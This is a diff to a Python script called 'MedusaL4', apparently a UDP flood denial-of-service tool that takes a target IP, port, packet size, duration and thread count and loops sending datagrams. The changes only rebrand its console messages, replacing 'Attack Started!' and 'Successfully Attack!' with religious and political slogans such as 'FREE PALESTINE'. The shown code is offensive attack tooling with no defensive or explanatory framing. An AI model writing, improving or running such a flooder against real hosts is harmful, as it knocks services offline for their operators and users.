@@ -22,7 +22,7 @@ if len(sys.argv) < 5:
 \033[0m""")
   sys.exit("\x1b[38;2;255;20;147m►► \033[0mUsage\x1b[38;2;255;20;147m: \033[0mpython3 \033[33mMedusaL4 \033[0m<\033[32mtimes\033[0m> <\033[32mip\033[0m> <\033[32mport\033[0m> <\033[32mpacket\033[0m> <\033[32mthreads\033[0m>")
 
-print("\x1b[31m[\x1b[33mMedusa\x1b[31m] \x1b[0mAttack Started!")
+print("\x1b[31m[\x1b[33mMedusa\x1b[31m] \x1b[0mBISMILLAH!")
 ip = str(sys.argv[1])
 port = int(sys.argv[2])
 packet = int(sys.argv[3])
@@ -34,7 +34,7 @@ timeout = time.time() + 1 * times
 def udp(ip, port, packet, times):
   timeout = time.time() + 1 * times
   s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
-  print(f"\x1b[31m[\x1b[33mMedusa\x1b[31m] \x1b[0mAttacking... \x1b[31m>  \x1b[0mtime \x1b[32m{times} \x1b[0mip \x1b[32m{ip}\x1b[31m:\x1b[32m{port}\x1b[0m packet \x1b[32m{packet}\x1b[0m threads \x1b[32m{threads}\x1b[0m ")
+  print(f"\x1b[31m[\x1b[33mMiyazawa\x1b[31m] \x1b[0mFREE PALESTINE    \x1b[31m>  \x1b[0mtime \x1b[32m{times} \x1b[0mip \x1b[32m{ip}\x1b[31m:\x1b[32m{port}\x1b[0m packet \x1b[32m{packet}\x1b[0m threads \x1b[32m{threads}\x1b[0m ")
   while time.time() < timeout:
     try:
       try:
@@ -45,7 +45,7 @@ def udp(ip, port, packet, times):
         s.close()
     except:
       s.close()
-  print("\x1b[31m[\x1b[33mMedusa\x1b[31m] > \x1b[0mSuccessfully Attack!")
+  print("\x1b[31m[\x1b[33mMedusa\x1b[31m] > \x1b[0mWASSALAMU ALAIKUM")
 
 def main():
   global threads
